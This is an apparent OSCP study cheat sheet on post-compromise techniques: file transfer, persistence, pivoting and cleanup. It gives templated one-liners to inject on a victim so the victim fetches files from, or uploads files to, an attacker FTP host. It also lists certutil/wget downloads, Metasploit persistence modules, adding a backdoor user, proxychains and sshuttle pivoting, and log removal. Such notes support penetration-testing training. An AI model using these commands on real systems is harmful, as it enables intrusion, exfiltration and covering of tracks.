---
aliases:
  - Active Directory Post Compromise Attacks
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - active_directory
  - post_exploitation
author: Mehdi N Tehrani
creat_date: 2023-12-10
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# File Transfer
#file_transfer #file_upload #file_download 
## References
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

## certutil
#certutil #windows
Windows
`certutil.exe -urlcache -f <url> <out_file>`
## ftp
#ftp 
- listening on attacker machine:
```sh
python3 -m python_ftp_server -u <user> -p <pass> --ip 0.0.0.0 [--port <local_port>]
```
### cmd
- code to inject to victim machine:
- #download #windows #cmd
```cmd
(echo open <lhost> <lport>&echo <user>&echo <pass>&echo bi&echo get <file>&echo bye) > f.t&ftp -s:f.t&del f.t
```
#upload #windows #cmd
```cmd
(echo open <lhost> <lport>&echo <user>&echo <pass>&echo bi&echo put <file>&echo bye) > f.t&ftp -s:f.t&del f.t
```
### powershell
- code to inject to victim machine:
- #download #windows #powershell
```cmd
echo "open <lhost> <lport>`n<user>`n<pass>`nbi`nget <file>`nbye" > f.t; ftp -s:f.t; rm f.t
```
#upload #windows #powershell
```cmd
echo "open <lhost> <lport>`n<user>`n<pass>`nbi`nput <file>`nbye" > f.t; ftp -s:f.t; rm f.t
```
## HTTP
`python -m http.server <port>`
## Browser
navigate directly to the file
## FTP
#ftp
server: `python -m pyftpdlib 21`
client: `ftp <ip>`
## Linux
#wget #curl
`wget <url>`
`curl <url> -o <out_file>`

## metasploit
#metasploit #file_transfer
download/upload files

# Persistence
#persistence
## Metasploit Persistence Scripts
#metasploit #danger
> [!danger] metasploit persistence opens an unauthenticated port on the machine. Any attacker can abuse this.

`msfconsole > run persistence -h`
`exploit/windows/local/persistence`
`exploit/windows/local/registry_persistence`
## Metasploit Scheduled Tasks
#scheduled_tasks 
`msfconsole > run scheduleme`
`msfconsole > run schtaskabuse`

## Add a user
#windows
`net user <username> <pass> /add`

# Pivoting
#pivoting #pivot
## proxychains
#proxychains
if the victim's machine has multiple network interfaces, on the attacker machine the following command can be run to be able to pivot across to the networks on the other interfaces:
```
$ cat /etc/proxychains4
[...]
socks4  127.0.0.1 9050

$ ssh -f -N -D 9050 <user>@<ip>
       ^ run ssh in background
          ^ not executing a remote command; used for port forwarding

$ proxychains nmap <ip>
$ proxychains xfreerdp /u:<user> /p:<pass> /v:<ip>
$ proxychains firefox
```
#xfreerdp #rdp 
## sshuttle
#sshuttle
an alternative to *proxychains*
### Install
`sudo pip install sshuttle`
### Usage
`sshuttle -r <user>@<ip> <subnet_CIDR> --ssh-cmd "ssh -i <private_key>"`
keep the above running and then try any command e.g. `nmap -p80 <ip>`

## chisel
#chisel
https://github.com/jpillora/chisel
https://ap3x.github.io/posts/pivoting-with-chisel/


# Cleanup
#cleanup
Remove executables, scripts, added files including malware, rootkit, user accounts
Set settings back to original configuration
removing logs
